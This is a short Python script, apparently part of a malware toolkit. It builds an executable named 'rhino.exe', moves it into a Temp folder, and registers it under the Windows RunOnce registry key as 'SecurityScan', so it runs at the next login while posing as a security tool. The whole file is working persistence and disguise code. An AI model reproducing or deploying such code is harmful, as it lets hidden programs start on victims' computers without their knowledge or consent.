import os, shutil, winreg

filedir = os.path.join(os.getcwd(), "Temp")
filename = "rhino.exe"
filepath = os.path.join(filedir, filename)

if os.path.isfile(filepath):
    os.remove(filepath)

os.system("python BuildExe.py")
shutil.move(filename, filedir)

regkey = 1

reghive = winreg.HKEY_CURRENT_USER if regkey < 2 else winreg.HKEY_LOCAL_MACHINE
regpath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" if (regkey % 2) == 0 else "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"

reg = winreg.ConnectRegistry(None, reghive)
key = winreg.CreateKey(reg, regpath)

winreg.SetValueEx(key, "SecurityScan", 0, winreg.REG_SZ, filepath)

winreg.CloseKey(key)
